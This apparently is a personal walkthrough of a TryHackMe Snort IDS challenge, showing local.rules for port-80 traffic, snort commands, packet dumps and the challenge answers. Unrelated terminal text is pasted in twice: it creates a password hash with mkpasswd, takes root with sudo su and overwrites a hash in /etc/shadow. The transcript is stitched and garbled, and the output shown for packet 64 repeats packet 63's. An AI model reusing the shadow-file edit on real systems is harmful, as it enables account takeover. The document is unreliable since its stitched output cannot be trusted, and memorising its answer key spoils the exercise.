---
Put your snort skills into practice and write snort rules to analyse live capture network traffic.
---

###  Introduction 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ad8de7609387c81ff8957c777f6aee82.png)

The room invites you a challenge to investigate a series of traffic data and stop malicious activity under two different scenarios. Let's start working with Snort to analyse live and captured traffic.

We recommend completing the Snort room first, which will teach you how to use the tool in depth.


![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ce7ed0edba5474a050296b933bc16693.png)

Exercise files for each task are located on the desktop as follows;

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fb02d4ed1cfa78634f05d3347ec61d94.png)

### Writing IDS Rules (HTTP) 

Let's create IDS Rules for HTTP traffic!



Navigate to the task folder.

Use the given pcap file.

Write rules to detect "all TCP port 80 traffic" packets in the given pcap file. 

What is the number of detected packets?

Note: You must answer this question correctly before answering the rest of the questions in this task.

You need to investigate inbound and outbound traffic on port 80. Writing two simple rules will help you.

```
┌──(kali㉿kali)-[~]
└─$ mkpasswd -m sha-512 Password1234
$6$337LYJ6n9X7PMx.h$wIKtRS.RoAzgfLcxSy0o7RN6.2degI2bvcfUKtLANJKuzjsx6vsExWBjaB65Dv988VkqL9TD4a69yiTV16jMq/
                                                                                          
┌──(kali㉿kali)-[~]
└─$ ssh ubuntu@10.10.135.44 
The authenticity of host '10.10.135.44 (10.10.135.44)' can't be established.
ED25519 key fingerprint is SHA256:9VinV6lSzIVHKOLNhG4WlbqlDOlI1KC2yfBl5TJqVsI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.135.44' (ED25519) to the list of known hosts.
ubuntu@10.10.135.44's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.8.0-1038-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec  6 23:08:28 UTC 2022

  System load:  0.05               Processes:             214
  Usage of /:   10.2% of 43.56GB   Users logged in:       0
  Memory usage: 18%                IPv4 address for eth0: 10.10.135.44
  Swap usage:   0%                 IPv4 address for eth1: 10.234.0.1

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

210 updates can be applied immediately.
104 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

/bin/bash: warning: shell level (1000) too high, resetting to 1
/bin/bash: warning: shell level (1000) too high, resetting to 1

/bin/bash: warning: shell level (1000) too high, resetting to 1
^Cubuntu@ip-10-10-135-44:~$ sudo su
root@ip-10-10-135-44:/home/ubuntu# ┌──(kali㉿kali)-[~]
└─$ mkpasswd -m sha-512 Password1234
$6$337LYJ6n9X7PMx.h$wIKtRS.RoAzgfLcxSy0o7RN6.2degI2bvcfUKtLANJKuzjsx6vsExWBjaB65Dv988VkqL9TD4a69yiTV16jMq/

Replacing this hash !$6$vmzKXtCowJO/EvOg$PcukzMtijIm6kj56vz7m33c6KExbF7Horki4oPeujuoVsOsonzlUm/w6e/Enmb.NAcOKVNBkHEC22j.5FyqHu0 by mine created before.

root@ip-10-10-135-44:/home/ubuntu# nano /etc/shadow


┌──(kali㉿kali)-[~]
└─$ ssh ubuntu@10.10.135.44 
The authenticity of host '10.10.135.44 (10.10.135.44)' can't be established.
ED25519 key fingerprint is SHA256:9VinV6lSzIVHKOLNhG4WlbqlDOlI1KC2yfBl5TJqVsI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.135.44' (ED25519) to the list of known hosts.
ubuntu@10.10.135.44's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.8.0-1038-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec  6 23:08:28 UTC 2022

  System load:  0.05               Processes:             214
  Usage of /:   10.2% of 43.56GB   Users logged in:       0
  Memory usage: 18%                IPv4 address for eth0: 10.10.135.44
  Swap usage:   0%                 IPv4 address for eth1: 10.234.0.1

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

210 updates can be applied immediately.
104 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

/bin/bash: warning: shell level (1000) too high, resetting to 1
/bin/bash: warning: shell level (1000) too high, resetting to 1

/bin/bash: warning: shell level (1000) too high, resetting to 1
^Cubuntu@ip-10-10-135-44:~$ sudo su
root@ip-10-10-135-44:/home/ubuntu# 

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
 Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-2 (HTTP)'/
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# ls
local.rules  mx-3.pcap
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# cat local.rules 

# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any 80 (msg:"Port 80 traffic";sid:100001;rev:1;)
alert tcp any 80 <> any any (msg:"Port 80 traffic";sid:100002;rev:1;)

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# sudo snort -c local.rules -A console -l . -dev -r mx-3.pcap

the above command contain the following parameters

    -A output should be in console mode
    -r read the following file (pcap in our case)
    - dev show packets in development mode (very useful in this room)
    -l log the file in the following directory (default in /var/log/snort/)
    -c read the rules from the following file (local.rules)

===============================================================================
Action Stats:
     Alerts:          328 ( 71.304%)
     Logged:          328 ( 71.304%)
     Passed:            0 (  0.000%)
Limits:
      Match:            0
      Queue:            0
        Log:            0
      Event:            0
      Alert:            0
Verdicts:
      Allow:          460 (100.000%)
      Block:            0 (  0.000%)
    Replace:            0 (  0.000%)
  Whitelist:            0 (  0.000%)
  Blacklist:            0 (  0.000%)
     Ignore:            0 (  0.000%)
      Retry:            0 (  0.000%)
===============================================================================
Snort exiting


```


*328*



Investigate the log file.

What is the destination address of packet 63?
"-n" parameter helps analyze the "n" number of packets.

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# ls
local.rules  mx-3.pcap  snort.log.1670370100

root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# sudo snort -dev -r snort.log.1670370100 -n 63


WARNING: No preprocessors configured for policy 0.
05/13-10:17:09.123830 FE:FF:20:00:01:00 -> 00:00:01:00:00:00 type:0x800 len:0x59A
65.208.228.223:80 -> 145.254.160.237:3372 TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF
***A**** Seq: 0x114C66F0  Ack: 0x38AFFFF3  Win: 0x1920  TcpLen: 20
20 20 20 20 20 20 20 20 20 20 3C 61 20 68 72 65            <a hre
66 3D 22 73 65 61 72 63 68 2E 68 74 6D 6C 22 3E  f="search.html">
53 65 61 72 63 68 3A 3C 2F 61 3E 0A 09 09 20 20  Search:</a>...  
3C 2F 64 69 76 3E 0A 09 20 20 20 20 20 20 20 20  </div>..        
3C 2F 74 64 3E 0A 09 20 20 20 20 20 20 20 20 3C  </td>..        <
74 64 3E 0A 09 20 20 20 20 20 20 20 20 20 20 3C  td>..          <
64 69 76 20 63 6C 61 73 73 3D 22 74 6F 70 66 6F  div class="topfo
72 6D 74 65 78 74 22 3E 0A 20 20 20 20 20 20 20  rmtext">.       
20 20 20 20 20 20 20 20 20 20 20 3C 69 6E 70 75             <inpu
74 20 74 79 70 65 3D 22 74 65 78 74 22 20 73 69  t type="text" si
7A 65 3D 22 31 32 22 20 6E 61 6D 65 3D 22 77 6F  ze="12" name="wo
72 64 73 22 3E 0A 09 09 20 20 3C 69 6E 70 75 74  rds">...  <input
20 74 79 70 65 3D 22 68 69 64 64 65 6E 22 20 6E   type="hidden" n
61 6D 65 3D 22 63 6F 6E 66 69 67 22 20 76 61 6C  ame="config" val
75 65 3D 22 65 74 68 65 72 65 61 6C 22 3E 0A 09  ue="ethereal">..
09 20 20 3C 2F 64 69 76 3E 0A 09 20 20 20 20 20  .  </div>..     
20 20 20 3C 2F 74 64 3E 0A 09 09 3C 74 64 20 76     </td>...<td v
61 6C 69 67 6E 3D 22 62 6F 74 74 6F 6D 22 3E 0A  align="bottom">.
09 09 20 20 3C 69 6E 70 75 74 20 74 79 70 65 3D  ..  <input type=
22 69 6D 61 67 65 22 20 63 6C 61 73 73 3D 22 67  "image" class="g
6F 62 75 74 74 6F 6E 22 20 73 72 63 3D 22 6D 6D  obutton" src="mm
2F 69 6D 61 67 65 2F 67 6F 2D 62 75 74 74 6F 6E  /image/go-button
2E 67 69 66 22 3E 0A 09 09 3C 2F 74 64 3E 0A 20  .gif">...</td>. 
20 20 20 20 20 20 20 20 20 20 20 20 20 3C 2F 74               </t
72 3E 0A 20 20 20 20 20 20 20 20 20 20 20 20 20  r>.             
20 3C 2F 66 6F 72 6D 3E 0A 3C 2F 74 61 62 6C 65   </form>.</table
3E 0A 09 20 20 3C 2F 64 69 76 3E 0A 20 20 20 20  >..  </div>.    
20 20 20 20 3C 2F 74 64 3E 0A 20 20 20 20 20 20      </td>.      
3C 2F 74 72 3E 0A 20 20 20 20 3C 2F 74 61 62 6C  </tr>.    </tabl
65 3E 0A 20 20 20 20 3C 2F 64 69 76 3E 0A 3C 64  e>.    </div>.<d
69 76 20 63 6C 61 73 73 3D 22 73 69 74 65 62 61  iv class="siteba
72 22 3E 0A 3C 70 3E 0A 20 20 3C 61 20 68 72 65  r">.<p>.  <a hre
66 3D 22 2F 22 3E 48 6F 6D 65 3C 2F 61 3E 0A 20  f="/">Home</a>. 
20 3C 73 70 61 6E 20 63 6C 61 73 73 3D 22 73 69   <span class="si
74 65 62 61 72 73 65 70 22 3E 7C 3C 2F 73 70 61  tebarsep">|</spa
6E 3E 0A 20 20 3C 61 20 68 72 65 66 3D 22 69 6E  n>.  <a href="in
74 72 6F 64 75 63 74 69 6F 6E 2E 68 74 6D 6C 22  troduction.html"
3E 49 6E 74 72 6F 64 75 63 74 69 6F 6E 3C 2F 61  >Introduction</a
3E 0A 20 20 3C 73 70 61 6E 20 63 6C 61 73 73 3D  >.  <span class=
22 73 69 74 65 62 61 72 73 65 70 22 3E 7C 3C 2F  "sitebarsep">|</
73 70 61 6E 3E 0A 20 20 44 6F 77 6E 6C 6F 61 64  span>.  Download
0A 20 20 3C 73 70 61 6E 20 63 6C 61 73 73 3D 22  .  <span class="
73 69 74 65 62 61 72 73 65 70 22 3E 7C 3C 2F 73  sitebarsep">|</s
70 61 6E 3E 0A 20 20 3C 61 20 68 72 65 66 3D 22  pan>.  <a href="
64 6F 63 73 2F 22 3E 44 6F 63 75 6D 65 6E 74 61  docs/">Documenta
74 69 6F 6E 3C 2F 61 3E 0A 20 20 3C 73 70 61 6E  tion</a>.  <span
20 63 6C 61 73 73 3D 22 73 69 74 65 62 61 72 73   class="sitebars
65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20 3C  ep">|</span>.  <
61 20 68 72 65 66 3D 22 6C 69 73 74 73 2F 22 3E  a href="lists/">
4C 69 73 74 73 3C 2F 61 3E 0A 20 20 3C 73 70 61  Lists</a>.  <spa
6E 20 63 6C 61 73 73 3D 22 73 69 74 65 62 61 72  n class="sitebar
73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20  sep">|</span>.  
3C 61 20 68 72 65 66 3D 22 66 61 71 2E 68 74 6D  <a href="faq.htm
6C 22 3E 46 41 51 3C 2F 61 3E 0A 20 20 3C 73 70  l">FAQ</a>.  <sp
61 6E 20 63 6C 61 73 73 3D 22 73 69 74 65 62 61  an class="siteba
72 73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20  rsep">|</span>. 
20 3C 61 20 68 72 65 66 3D 22 64 65 76 65 6C 6F   <a href="develo
70 6D 65 6E 74 2E 68 74 6D 6C 22 3E 44 65 76 65  pment.html">Deve
6C 6F 70 6D 65 6E 74 3C 2F 61 3E 0A 3C 2F 70 3E  lopment</a>.</p>
0A 3C 2F 64 69 76 3E 0A 3C 64 69 76 20 63 6C 61  .</div>.<div cla
73 73 3D 22 6E 61 76 62 61 72 22 3E 0A 3C 70 3E  ss="navbar">.<p>
0A 20 20 3C 61 20 68 72 65 66 3D 22 23 72 65 6C  .  <a href="#rel
65 61 73 65 73 22 3E 4F 66 66 69 63 69 61 6C 20  eases">Official 
52 65 6C 65 61 73 65 73 3C 2F 61 3E 0A 20 20 3C  Releases</a>.  <
73 70 61 6E 20 63 6C 61 73 73 3D 22 6E 61 76 62  span class="navb
61 72 73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A  arsep">|</span>.
20 20 3C 61 20 68 72 65 66 3D 22 23 6F 74 68 65    <a href="#othe
72 70 6C 61 74 22 3E 4F 74 68 65 72 20 50 6C 61  rplat">Other Pla
74 66 6F 72 6D 73 3C 2F 61 3E 0A 20 20 3C 73 70  tforms</a>.  <sp
61 6E 20 63 6C 61 73 73 3D 22 6E 61 76 62 61 72  an class="navbar
73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20  sep">|</span>.  
3C 61 20 68 72 65 66 3D 22 23 6F 74 68 65 72 64  <a href="#otherd
6F 77 6E 22 3E 4F 74 68 65 72 20 44 6F 77 6E 6C  own">Other Downl
6F 61 64 73 3C 2F 61 3E 0A 20 20 3C 73 70 61 6E  oads</a>.  <span
20 63 6C 61 73 73 3D 22 6E 61 76 62 61 72 73 65   class="navbarse
70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20 3C 61  p">|</span>.  <a
20 68 72 65 66 3D 22 23 6C 65 67 61 6C 22 3E 4C   href="#legal">L
65 67 61 6C 20 4E 6F 74 69 63 65 73 3C 2F 61 3E  egal Notices</a>
0A 3C 2F 70 3E 0A 3C 2F 64 69 76 3E 0A 3C 21 2D  .</p>.</div>.<!-
2D 20 42 65 67 69 6E 20 41 64 20 34 36 38 78 36  - Begin Ad 468x6
30 20 2D 2D 3E 0A 3C 64 69 76 20 63 6C 61 73 73  0 -->.<div class
3D 22 61 64 62 6C 6F 63 6B 22 3E 0A 3C 73 63 72  ="adblock">.<scr
69 70 74 20 74 79 70 65 3D 22 74 65 78 74 2F 6A  ipt type="text/j
61 76 61 73 63 72 69 70 74 22 3E 3C 21 2D 2D 0A  avascript"><!--.
67 6F 6F 67 6C 65 5F 61 64 5F 63 6C 69 65 6E 74  google_ad_client
20 3D 20 22 70 75 62 2D 32 33 30 39 31 39 31 39   = "pub-23091919
34 38 36 37                                      4867

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.7245 seconds
Snort processed 63 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           63
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:           63
   Analyzed:           63 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:           63 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:           63 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:           63 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:           63
===============================================================================
Snort exiting

145.254.160.237:3372

```

*145.254.160.237*


Investigate the log file.

 What is the ACK number of packet 64?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# sudo snort -dev -r snort.log.1670370100 -n 64


WARNING: No preprocessors configured for policy 0.
05/13-10:17:09.123830 FE:FF:20:00:01:00 -> 00:00:01:00:00:00 type:0x800 len:0x59A
65.208.228.223:80 -> 145.254.160.237:3372 TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF
***A**** Seq: 0x114C66F0  Ack: 0x38AFFFF3  Win: 0x1920  TcpLen: 20
20 20 20 20 20 20 20 20 20 20 3C 61 20 68 72 65            <a hre
66 3D 22 73 65 61 72 63 68 2E 68 74 6D 6C 22 3E  f="search.html">
53 65 61 72 63 68 3A 3C 2F 61 3E 0A 09 09 20 20  Search:</a>...  
3C 2F 64 69 76 3E 0A 09 20 20 20 20 20 20 20 20  </div>..        
3C 2F 74 64 3E 0A 09 20 20 20 20 20 20 20 20 3C  </td>..        <
74 64 3E 0A 09 20 20 20 20 20 20 20 20 20 20 3C  td>..          <
64 69 76 20 63 6C 61 73 73 3D 22 74 6F 70 66 6F  div class="topfo
72 6D 74 65 78 74 22 3E 0A 20 20 20 20 20 20 20  rmtext">.       
20 20 20 20 20 20 20 20 20 20 20 3C 69 6E 70 75             <inpu
74 20 74 79 70 65 3D 22 74 65 78 74 22 20 73 69  t type="text" si
7A 65 3D 22 31 32 22 20 6E 61 6D 65 3D 22 77 6F  ze="12" name="wo
72 64 73 22 3E 0A 09 09 20 20 3C 69 6E 70 75 74  rds">...  <input
20 74 79 70 65 3D 22 68 69 64 64 65 6E 22 20 6E   type="hidden" n
61 6D 65 3D 22 63 6F 6E 66 69 67 22 20 76 61 6C  ame="config" val
75 65 3D 22 65 74 68 65 72 65 61 6C 22 3E 0A 09  ue="ethereal">..
09 20 20 3C 2F 64 69 76 3E 0A 09 20 20 20 20 20  .  </div>..     
20 20 20 3C 2F 74 64 3E 0A 09 09 3C 74 64 20 76     </td>...<td v
61 6C 69 67 6E 3D 22 62 6F 74 74 6F 6D 22 3E 0A  align="bottom">.
09 09 20 20 3C 69 6E 70 75 74 20 74 79 70 65 3D  ..  <input type=
22 69 6D 61 67 65 22 20 63 6C 61 73 73 3D 22 67  "image" class="g
6F 62 75 74 74 6F 6E 22 20 73 72 63 3D 22 6D 6D  obutton" src="mm
2F 69 6D 61 67 65 2F 67 6F 2D 62 75 74 74 6F 6E  /image/go-button
2E 67 69 66 22 3E 0A 09 09 3C 2F 74 64 3E 0A 20  .gif">...</td>. 
20 20 20 20 20 20 20 20 20 20 20 20 20 3C 2F 74               </t
72 3E 0A 20 20 20 20 20 20 20 20 20 20 20 20 20  r>.             
20 3C 2F 66 6F 72 6D 3E 0A 3C 2F 74 61 62 6C 65   </form>.</table
3E 0A 09 20 20 3C 2F 64 69 76 3E 0A 20 20 20 20  >..  </div>.    
20 20 20 20 3C 2F 74 64 3E 0A 20 20 20 20 20 20      </td>.      
3C 2F 74 72 3E 0A 20 20 20 20 3C 2F 74 61 62 6C  </tr>.    </tabl
65 3E 0A 20 20 20 20 3C 2F 64 69 76 3E 0A 3C 64  e>.    </div>.<d
69 76 20 63 6C 61 73 73 3D 22 73 69 74 65 62 61  iv class="siteba
72 22 3E 0A 3C 70 3E 0A 20 20 3C 61 20 68 72 65  r">.<p>.  <a hre
66 3D 22 2F 22 3E 48 6F 6D 65 3C 2F 61 3E 0A 20  f="/">Home</a>. 
20 3C 73 70 61 6E 20 63 6C 61 73 73 3D 22 73 69   <span class="si
74 65 62 61 72 73 65 70 22 3E 7C 3C 2F 73 70 61  tebarsep">|</spa
6E 3E 0A 20 20 3C 61 20 68 72 65 66 3D 22 69 6E  n>.  <a href="in
74 72 6F 64 75 63 74 69 6F 6E 2E 68 74 6D 6C 22  troduction.html"
3E 49 6E 74 72 6F 64 75 63 74 69 6F 6E 3C 2F 61  >Introduction</a
3E 0A 20 20 3C 73 70 61 6E 20 63 6C 61 73 73 3D  >.  <span class=
22 73 69 74 65 62 61 72 73 65 70 22 3E 7C 3C 2F  "sitebarsep">|</
73 70 61 6E 3E 0A 20 20 44 6F 77 6E 6C 6F 61 64  span>.  Download
0A 20 20 3C 73 70 61 6E 20 63 6C 61 73 73 3D 22  .  <span class="
73 69 74 65 62 61 72 73 65 70 22 3E 7C 3C 2F 73  sitebarsep">|</s
70 61 6E 3E 0A 20 20 3C 61 20 68 72 65 66 3D 22  pan>.  <a href="
64 6F 63 73 2F 22 3E 44 6F 63 75 6D 65 6E 74 61  docs/">Documenta
74 69 6F 6E 3C 2F 61 3E 0A 20 20 3C 73 70 61 6E  tion</a>.  <span
20 63 6C 61 73 73 3D 22 73 69 74 65 62 61 72 73   class="sitebars
65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20 3C  ep">|</span>.  <
61 20 68 72 65 66 3D 22 6C 69 73 74 73 2F 22 3E  a href="lists/">
4C 69 73 74 73 3C 2F 61 3E 0A 20 20 3C 73 70 61  Lists</a>.  <spa
6E 20 63 6C 61 73 73 3D 22 73 69 74 65 62 61 72  n class="sitebar
73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20  sep">|</span>.  
3C 61 20 68 72 65 66 3D 22 66 61 71 2E 68 74 6D  <a href="faq.htm
6C 22 3E 46 41 51 3C 2F 61 3E 0A 20 20 3C 73 70  l">FAQ</a>.  <sp
61 6E 20 63 6C 61 73 73 3D 22 73 69 74 65 62 61  an class="siteba
72 73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20  rsep">|</span>. 
20 3C 61 20 68 72 65 66 3D 22 64 65 76 65 6C 6F   <a href="develo
70 6D 65 6E 74 2E 68 74 6D 6C 22 3E 44 65 76 65  pment.html">Deve
6C 6F 70 6D 65 6E 74 3C 2F 61 3E 0A 3C 2F 70 3E  lopment</a>.</p>
0A 3C 2F 64 69 76 3E 0A 3C 64 69 76 20 63 6C 61  .</div>.<div cla
73 73 3D 22 6E 61 76 62 61 72 22 3E 0A 3C 70 3E  ss="navbar">.<p>
0A 20 20 3C 61 20 68 72 65 66 3D 22 23 72 65 6C  .  <a href="#rel
65 61 73 65 73 22 3E 4F 66 66 69 63 69 61 6C 20  eases">Official 
52 65 6C 65 61 73 65 73 3C 2F 61 3E 0A 20 20 3C  Releases</a>.  <
73 70 61 6E 20 63 6C 61 73 73 3D 22 6E 61 76 62  span class="navb
61 72 73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A  arsep">|</span>.
20 20 3C 61 20 68 72 65 66 3D 22 23 6F 74 68 65    <a href="#othe
72 70 6C 61 74 22 3E 4F 74 68 65 72 20 50 6C 61  rplat">Other Pla
74 66 6F 72 6D 73 3C 2F 61 3E 0A 20 20 3C 73 70  tforms</a>.  <sp
61 6E 20 63 6C 61 73 73 3D 22 6E 61 76 62 61 72  an class="navbar
73 65 70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20  sep">|</span>.  
3C 61 20 68 72 65 66 3D 22 23 6F 74 68 65 72 64  <a href="#otherd
6F 77 6E 22 3E 4F 74 68 65 72 20 44 6F 77 6E 6C  own">Other Downl
6F 61 64 73 3C 2F 61 3E 0A 20 20 3C 73 70 61 6E  oads</a>.  <span
20 63 6C 61 73 73 3D 22 6E 61 76 62 61 72 73 65   class="navbarse
70 22 3E 7C 3C 2F 73 70 61 6E 3E 0A 20 20 3C 61  p">|</span>.  <a
20 68 72 65 66 3D 22 23 6C 65 67 61 6C 22 3E 4C   href="#legal">L
65 67 61 6C 20 4E 6F 74 69 63 65 73 3C 2F 61 3E  egal Notices</a>
0A 3C 2F 70 3E 0A 3C 2F 64 69 76 3E 0A 3C 21 2D  .</p>.</div>.<!-
2D 20 42 65 67 69 6E 20 41 64 20 34 36 38 78 36  - Begin Ad 468x6
30 20 2D 2D 3E 0A 3C 64 69 76 20 63 6C 61 73 73  0 -->.<div class
3D 22 61 64 62 6C 6F 63 6B 22 3E 0A 3C 73 63 72  ="adblock">.<scr
69 70 74 20 74 79 70 65 3D 22 74 65 78 74 2F 6A  ipt type="text/j
61 76 61 73 63 72 69 70 74 22 3E 3C 21 2D 2D 0A  avascript"><!--.
67 6F 6F 67 6C 65 5F 61 64 5F 63 6C 69 65 6E 74  google_ad_client
20 3D 20 22 70 75 62 2D 32 33 30 39 31 39 31 39   = "pub-23091919
34 38 36 37                                      4867

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.7736 seconds
Snort processed 64 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           64
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
  Bytes in mapped regions (hblkhd):      13180928
  Total allocated space (uordblks):      678144
  Total free space (fordblks):           108288
  Topmost releasable block (keepcost):   102304
===============================================================================
Packet I/O Totals:
   Received:           64
   Analyzed:           64 (100.000%)
    Dropped:            0 (  0.000%)
   Filtered:            0 (  0.000%)
Outstanding:            0 (  0.000%)
   Injected:            0
===============================================================================
Breakdown by protocol (includes rebuilt packets):
        Eth:           64 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:           64 (100.000%)
       Frag:            0 (  0.000%)
       ICMP:            0 (  0.000%)
        UDP:            0 (  0.000%)
        TCP:           64 (100.000%)
        IP6:            0 (  0.000%)
    IP6 Ext:            0 (  0.000%)
   IP6 Opts:            0 (  0.000%)
      Frag6:            0 (  0.000%)
      ICMP6:            0 (  0.000%)
       UDP6:            0 (  0.000%)
       TCP6:            0 (  0.000%)
     Teredo:            0 (  0.000%)
    ICMP-IP:            0 (  0.000%)
    IP4/IP4:            0 (  0.000%)
    IP4/IP6:            0 (  0.000%)
    IP6/IP4:            0 (  0.000%)
    IP6/IP6:            0 (  0.000%)
        GRE:            0 (  0.000%)
    GRE Eth:            0 (  0.000%)
   GRE VLAN:            0 (  0.000%)
    GRE IP4:            0 (  0.000%)
    GRE IP6:            0 (  0.000%)
GRE IP6 Ext:            0 (  0.000%)
   GRE PPTP:            0 (  0.000%)
    GRE ARP:            0 (  0.000%)
    GRE IPX:            0 (  0.000%)
   GRE Loop:            0 (  0.000%)
       MPLS:            0 (  0.000%)
        ARP:            0 (  0.000%)
        IPX:            0 (  0.000%)
   Eth Loop:            0 (  0.000%)
   Eth Disc:            0 (  0.000%)
   IP4 Disc:            0 (  0.000%)
   IP6 Disc:            0 (  0.000%)
   TCP Disc:            0 (  0.000%)
   UDP Disc:            0 (  0.000%)
  ICMP Disc:            0 (  0.000%)
All Discard:            0 (  0.000%)
      Other:            0 (  0.000%)
Bad Chk Sum:            0 (  0.000%)
    Bad TTL:            0 (  0.000%)
     S5 G 1:            0 (  0.000%)
     S5 G 2:            0 (  0.000%)
      Total:           64
===============================================================================
Snort exiting

```


*0x38AFFFF3*

Investigate the log file.

What is the SEQ number of packet 62?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)# sudo snort -dev -r snort.log.1670370100 -n 62

WARNING: No preprocessors configured for policy 0.
05/13-10:17:09.123830 00:00:01:00:00:00 -> FE:FF:20:00:01:00 type:0x800 len:0x36
145.254.160.237:3372 -> 65.208.228.223:80 TCP TTL:128 TOS:0x0 ID:3910 IpLen:20 DgmLen:40 DF
***A**** Seq: 0x38AFFFF3  Ack: 0x114C66F0  Win: 0x25BC  TcpLen: 20

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.7603 seconds
Snort processed 62 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           62
===============================================================================
Memory usage summary:
  Total non-mmapped bytes (arena):       786432
